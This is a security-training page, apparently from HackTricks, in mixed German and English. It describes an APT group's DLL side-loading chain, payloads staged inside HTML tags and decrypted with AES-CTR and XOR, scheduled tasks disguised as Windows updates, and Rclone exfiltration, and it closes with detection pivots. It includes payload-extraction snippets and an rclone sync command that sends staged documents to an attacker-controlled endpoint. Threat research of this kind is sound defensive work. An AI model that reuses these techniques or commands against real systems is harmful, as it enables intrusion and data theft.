# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) nutzte ein wiederholbares Muster, das DLL sideloading, staged HTML payloads und modulare .NET backdoors verkettet, um in diplomatischen Netzwerken des Nahen Ostens persistent zu bleiben. Die Technik ist für jeden Operator wiederverwendbar, weil sie sich auf Folgendes stützt:

- **Archive-based social engineering**: harmlose PDFs veranlassen Ziele, ein RAR-Archiv von einer Dateifreigabe-Website herunterzuladen. Das Archiv enthält einen realistisch wirkenden Dokumentviewer-EXE, eine bösartige DLL, die nach einer vertrauenswürdigen Bibliothek benannt ist (z. B. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), und eine Köder-`Document.pdf`.
- **DLL search order abuse**: das Opfer doppelklickt die EXE, Windows löst die DLL-Importe aus dem aktuellen Verzeichnis auf, und der bösartige Loader (AshenLoader) läuft im vertrauenswürdigen Prozess, während die Köder-PDF geöffnet wird, um Verdacht zu vermeiden.
- **Living-off-the-land staging**: jede spätere Stufe (AshenStager → AshenOrchestrator → modules) bleibt bis zur Verwendung nicht auf der Festplatte und wird als verschlüsselte Blobs geliefert, die in ansonsten harmlosen HTML-Antworten versteckt sind.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: die EXE side-loads AshenLoader, der Host-Recon durchführt, ihn mit AES-CTR verschlüsselt und per POST in rotierenden Parametern wie `token=`, `id=`, `q=` oder `auth=` an API-ähnliche Pfade (z. B. `/api/v2/account`) sendet.
2. **HTML extraction**: der C2 verrät die nächste Stufe nur, wenn die Client-IP in die Zielregion geolokalisiert wird und der `User-Agent` zum Implantat passt, was Sandboxes frustriert. Wenn die Prüfungen bestehen, enthält der HTTP-Body einen `<headerp>...</headerp>`-Blob mit dem Base64/AES-CTR-verschlüsselten AshenStager-Payload.
3. **Second sideload**: AshenStager wird zusammen mit einem weiteren legitimen Binary bereitgestellt, das `wtsapi32.dll` importiert. Die bösartige Kopie, die in das Binary injiziert wurde, holt weiteres HTML und extrahiert diesmal `<article>...</article>`, um AshenOrchestrator wiederherzustellen.
4. **AshenOrchestrator**: ein modularer .NET-Controller, der eine Base64-codierte JSON-Konfiguration decodiert. Die Felder `tg` und `au` der Konfiguration werden verkettet/gehasht und bilden den AES-Schlüssel, der `xrk` entschlüsselt. Die resultierenden Bytes fungieren als XOR-Schlüssel für jeden danach abgerufenen Module-Blob.
5. **Module delivery**: jedes Modul wird durch HTML-Kommentare beschrieben, die den Parser zu einem beliebigen Tag umleiten und statische Regeln umgehen, die nur nach `<headerp>` oder `<article>` suchen. Module umfassen persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) und file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
### Schneller Extraktionshelfer (Python)

Selbst wenn Verteidiger ein bestimmtes Element blockieren oder entfernen, muss der Operator lediglich das im HTML-Kommentar angedeutete Tag ändern, um die Zustellung fortzusetzen.
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Jüngste HTML smuggling-Forschung (Talos) hebt Payloads hervor, die als Base64-Strings innerhalb von `<script>`-Blöcken in HTML-Anhängen versteckt und zur Laufzeit per JavaScript dekodiert werden. Derselbe Trick lässt sich für C2-Antworten wiederverwenden: stage encrypted blobs inside a script tag (or other DOM element) und dekodiere sie im Speicher vor AES/XOR, sodass die Seite wie gewöhnliches HTML aussieht.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: aktuelle Loader betten 256-Bit-Schlüssel plus Nonces ein (z. B. `{9a 20 51 98 ...}`) und fügen optional eine XOR-Schicht hinzu, die Strings wie `msasn1.dll` vor/nach der Entschlüsselung verwendet.
- **Infrastructure split + subdomain camouflage**: Staging-Server sind pro Tool getrennt, über verschiedene ASNs verteilt gehostet und manchmal hinter legitim aussehenden Subdomains vorgelagert, sodass das Brennen einer Stage nicht den Rest offenlegt.
- **Recon smuggling**: Die aufgelisteten Daten umfassen jetzt Program Files-Verzeichnisse, um hochgradig wertvolle Anwendungen zu erkennen, und werden stets verschlüsselt, bevor sie den Host verlassen.
- **URI churn**: Query-Parameter und REST-Pfade rotieren zwischen Kampagnen (`/api/v1/account?token=` → `/api/v2/account?auth=`), wodurch fragile Erkennungen ungültig werden.
- **Gated delivery**: Server sind geo-gegrenzt und antworten nur auf echte implants. Unautorisierte Clients erhalten unverdächtiges HTML.

## Persistence & Execution Loop

AshenStager legt Scheduled Tasks ab, die sich als Windows-Wartungsjobs tarnen und via `svchost.exe` ausgeführt werden, z. B.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Diese Tasks starten die sideloading chain beim Booten oder in Intervallen neu und stellen so sicher, dass AshenOrchestrator frische Module anfordern kann, ohne erneut die Festplatte zu berühren.

## Using Benign Sync Clients for Exfiltration

Operatoren legen diplomatische Dokumente in `C:\Users\Public` ab (weltweit lesbar und unverdächtig) über ein dediziertes Modul und laden dann das legitime [Rclone](https://rclone.org/) Binary herunter, um dieses Verzeichnis mit dem Angreifer-Storage zu synchronisieren. Unit42 stellt fest, dass dies das erste Mal ist, dass dieser Akteur Rclone für Exfiltration beobachtet wurde, was mit dem breiteren Trend zusammenpasst, legitime Sync-Tools zu missbrauchen, um sich in normalen Traffic einzufügen:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Da Rclone weit verbreitet in legitimen Backup-Workflows eingesetzt wird, müssen Verteidiger auf anomale Ausführungen achten (neue Binaries, ungewöhnliche remotes oder plötzliches Synchronisieren von `C:\Users\Public`).

## Detection Pivots

- Alarm bei **signierten Prozessen**, die unerwartet DLLs aus user-writable paths laden (Procmon-Filter + `Get-ProcessMitigation -Module`), besonders wenn die DLL-Namen mit `netutils`, `srvcli`, `dwampi` oder `wtsapi32` übereinstimmen.
- Untersuche verdächtige HTTPS-Antworten auf **große Base64-Blobs, eingebettet in ungewöhnliche Tags**, oder geschützt durch `<!-- TAG: <xyz> -->`-Kommentare.
- Erweitere HTML-Hunting auf **Base64-Strings innerhalb von `<script>`-Blöcken** (HTML smuggling-style staging), die via JavaScript vor AES/XOR dekodiert werden.
- Suche nach **scheduled tasks**, die `svchost.exe` mit Nicht-Service-Argumenten ausführen oder auf Dropper-Verzeichnisse verweisen.
- Überwache das Auftauchen von **Rclone**-Binaries außerhalb IT-verwalteter Orte, neue `rclone.conf`-Dateien oder Sync-Jobs, die von Staging-Verzeichnissen wie `C:\Users\Public` ziehen.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
